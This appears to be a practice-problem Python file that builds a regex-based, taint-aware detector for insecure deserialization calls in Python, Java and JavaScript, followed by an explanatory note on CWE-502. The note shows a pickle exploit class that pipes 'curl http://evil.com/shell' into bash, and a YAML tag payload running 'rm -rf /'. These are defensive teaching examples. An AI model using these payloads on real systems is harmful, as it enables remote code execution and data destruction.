"""
=============================================================================
Q52 [Hard] — Insecure Deserialization Static Detector
=============================================================================

PROBLEM
-------
Detect dangerous deserialization calls in Python, Java, and JavaScript code:
  Python:  pickle.loads, yaml.load (without Loader), marshal.loads,
           shelve.open, jsonpickle.decode, dill.loads.
  Java:    ObjectInputStream.readObject, XMLDecoder, readUnshared,
           XStream.fromXML.
  JS:      eval(JSON), Function(), unserialize(), node-serialize.
  Also flag: user-controlled data flowing into any deserialization call.

CLARIFYING QUESTIONS
--------------------
1. Languages? → Python, JavaScript, Java (heuristic; no AST).
2. What is "safe"?
   → json.loads (built-in, no code exec), yaml.safe_load,
     ast.literal_eval (value types only), manual schema validation.
3. Output? → Structured findings with severity.

=============================================================================
APPROACH 1 — NAIVE (grep for pickle / yaml)
=============================================================================
  Flags every occurrence; no taint correlation; misses yaml.load(safe=False).

=============================================================================
APPROACH 2 — TAINT-AWARE DESERIAL DETECTOR (OPTIMAL)
=============================================================================
  1. Catalog dangerous deserialization functions.
  2. Identify if user-controlled data flows into them.
  3. Apply safe-pattern suppressors.

=============================================================================
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import List, Optional, Set, Tuple


# ---------------------------------------------------------------------------
# Data Types
# ---------------------------------------------------------------------------

@dataclass
class DeserialFinding:
    file: str
    line_number: int
    severity: str
    rule_name: str
    evidence: str
    line_preview: str

    def __str__(self) -> str:
        return (
            f"[{self.severity.upper()}] {self.file}:{self.line_number} "
            f"rule={self.rule_name!r}: {self.evidence[:60]}"
        )


@dataclass
class DeserialScanResult:
    filename: str
    findings: List[DeserialFinding] = field(default_factory=list)
    lines_scanned: int = 0

    @property
    def has_findings(self) -> bool:
        return bool(self.findings)


# ---------------------------------------------------------------------------
# Sink catalog: (rule_name, pattern, severity, notes)
# ---------------------------------------------------------------------------

_DESERIAL_SINKS: List[Tuple[str, re.Pattern, str]] = [
    # Python — HIGH (arbitrary code execution)
    ("pickle_loads",        re.compile(r"\bpickle\.(loads?|Unpickler)\s*\("),          "high"),
    ("pickle_load_file",    re.compile(r"\bpickle\.load\s*\("),                        "high"),
    ("marshal_loads",       re.compile(r"\bmarshal\.(loads?)\s*\("),                   "high"),
    ("dill_loads",          re.compile(r"\bdill\.(loads?|load)\s*\("),                 "high"),
    ("shelve_open",         re.compile(r"\bshelve\.open\s*\("),                        "medium"),
    ("jsonpickle_decode",   re.compile(r"\bjsonpickle\.decode\s*\("),                  "high"),
    ("yaml_load_unsafe",    re.compile(r"\byaml\.load\s*\((?!.*Loader\s*=\s*yaml\.SafeLoader)"),  "high"),
    ("yaml_full_loader",    re.compile(r"\byaml\.load\s*\(.*Loader\s*=\s*yaml\.(FullLoader|UnsafeLoader|CLoader)"), "medium"),
    ("codecs_decode",       re.compile(r"\bcodecs\.decode\s*\("),                      "low"),
    # Java-like patterns (heuristic string match)
    ("java_readobject",     re.compile(r"\bObjectInputStream\b.*\breadObject\s*\("),   "high"),
    ("java_xmldecoder",     re.compile(r"\bXMLDecoder\b"),                             "high"),
    ("java_xstream",        re.compile(r"\bXStream\b.*\.(fromXML|unmarshal)\s*\("),   "high"),
    ("java_readunshared",   re.compile(r"\breadUnshared\s*\("),                        "high"),
    ("java_kryo",           re.compile(r"\bKryo\b.*\bdeserialize\b"),                  "medium"),
    # JavaScript
    ("js_eval_json",        re.compile(r"\beval\s*\(\s*(?!\s*['\"])"),                "high"),
    ("js_function_ctor",    re.compile(r"\bnew\s+Function\s*\("),                     "high"),
    ("js_node_serialize",   re.compile(r"\bnode-serialize\b|unserialize\s*\("),       "high"),
    ("js_vm_runin",         re.compile(r"\bvm\.runInThisContext\s*\("),               "high"),
]

# Safe patterns (suppress)
_SAFE_PATTERNS: List[re.Pattern] = [
    re.compile(r"\bjson\.loads?\s*\("),                      # json module is safe
    re.compile(r"\byaml\.safe_load\s*\("),                   # safe YAML
    re.compile(r"\bast\.literal_eval\s*\("),                 # safe Python eval
    re.compile(r"\bJSON\.parse\s*\("),                       # JS JSON.parse
    re.compile(r"Loader\s*=\s*yaml\.SafeLoader"),
    re.compile(r"^\s*#"),
    re.compile(r"#\s*(nosec|noqa|safe)"),
]

_SOURCE_PATTERNS: List[Tuple[str, re.Pattern]] = [
    ("flask_args",   re.compile(r"request\.(args|form|values|GET|POST|data|json)(\[|\.get\s*\(|\.read\s*\()")),
    ("req_body",     re.compile(r"req\.(body|params|query)\s*[\[.]")),
    ("input_func",   re.compile(r"\binput\s*\(")),
    ("sys_argv",     re.compile(r"\bsys\.argv\b")),
    ("socket_recv",  re.compile(r"\.(recv|read)\s*\(")),     # network data
    ("file_read",    re.compile(r"\.read\s*\(\s*\)")),
]

_VAR_FROM_SOURCE = re.compile(
    r"^\s*(\w+)\s*=\s*.*(?:request\.|req\.|input\(|sys\.argv|\.recv\s*\(|\.read\s*\()",
    re.IGNORECASE,
)


def _line_is_safe(line: str) -> bool:
    return any(p.search(line) for p in _SAFE_PATTERNS)


def _source_on_line(line: str) -> Optional[str]:
    for name, pat in _SOURCE_PATTERNS:
        if pat.search(line):
            return name
    return None


def _sink_on_line(line: str) -> Optional[Tuple[str, str, str]]:
    for name, pat, sev in _DESERIAL_SINKS:
        m = pat.search(line)
        if m:
            return name, m.group(0), sev
    return None


# ---------------------------------------------------------------------------
# APPROACH 1 — Naive
# ---------------------------------------------------------------------------

def detect_naive(code: str) -> List[str]:
    results = []
    for i, line in enumerate(code.splitlines(), 1):
        if re.search(r"pickle|yaml\.load|marshal|readObject", line):
            results.append(f"Line {i}: {line.strip()}")
    return results


# ---------------------------------------------------------------------------
# APPROACH 2 — Taint-aware detector
# ---------------------------------------------------------------------------

class InsecureDeserializationDetector:
    """
    Detects insecure deserialization via taint-aware heuristics.
    """

    def detect(self, code: str, filename: str = "<code>") -> DeserialScanResult:
        result = DeserialScanResult(filename=filename)
        lines  = code.splitlines()
        result.lines_scanned = len(lines)

        # Collect tainted variables
        tainted: Set[str] = set()
        for line in lines:
            m = _VAR_FROM_SOURCE.match(line)
            if m:
                tainted.add(m.group(1))

        for line_idx, line in enumerate(lines, start=1):
            if _line_is_safe(line):
                continue

            sink = _sink_on_line(line)
            if sink is None:
                continue

            sink_name, sink_text, base_sev = sink

            # Determine severity: upgrade to HIGH if user-controlled
            src = _source_on_line(line)
            matched_tv = next(
                (tv for tv in tainted
                 if re.search(r'\b' + re.escape(tv) + r'\b', line)),
                None,
            )

            if src or matched_tv:
                severity = "high"
                evidence = f"tainted_source={src or matched_tv}"
            else:
                severity = base_sev
                evidence = sink_text[:60]

            result.findings.append(DeserialFinding(
                file=filename, line_number=line_idx,
                severity=severity,
                rule_name=sink_name,
                evidence=evidence,
                line_preview=line.strip()[:100],
            ))

        return result

def test_pickle_user_data():
    code = """
import pickle
from flask import request

data = request.data.read()
obj = pickle.loads(data)
"""
    d = InsecureDeserializationDetector()
    r = d.detect(code, "api.py")
    print(f"pickle.loads findings: {[str(f) for f in r.findings]}")
    assert r.has_findings
    high = [f for f in r.findings if f.severity == "high"]
    assert high
    print("pickle.loads user data: passed")

"""
INSECURE DESERIALIZATION — CWE-502 / OWASP A8
------------------------------------------------
Root Cause: Deserializing untrusted data with a format that can
instantiate arbitrary objects or execute code.

PYTHON ATTACK (pickle)
-----------------------
  import pickle, os
  class Exploit:
      def __reduce__(self):
          return (os.system, ("curl http://evil.com/shell | bash",))
  payload = pickle.dumps(Exploit())
  # Server-side:
  obj = pickle.loads(payload)   # executes os.system on deserialize

JAVA GADGET CHAINS
------------------
  Apache Commons Collections, Spring, Groovy provide "gadget chains":
  serialized objects that, when deserialized, execute arbitrary methods.
  CVE-2015-4852 (WebLogic), CVE-2016-4438 (Struts2), etc.
  Tools: ysoserial generates payloads for known gadget chains.

YAML TAG ATTACKS (Python)
--------------------------
  payload.yaml:
    !!python/object/apply:os.system ["rm -rf /"]
  yaml.load(payload)   # executes os.system

SAFE ALTERNATIVES
-----------------
  Python: json.loads, yaml.safe_load, ast.literal_eval.
          Avoid pickle for user-supplied data entirely.
          If you must use pickle: sign with HMAC; verify before loading.
  Java:   Use JSON (Jackson, Gson) with strict type restrictions.
          Disable global default typing in Jackson.
          Use SerialKiller or OWASP deserialization filters.
  JS:     JSON.parse only; never eval() user data.

DEFENSE IN DEPTH
-----------------
  Isolate deserializers in sandboxes (containers, seccomp).
  Network-level: restrict outbound from deserializing services.
  Integrity checks: HMAC-sign blobs before serialization; verify on load.
"""
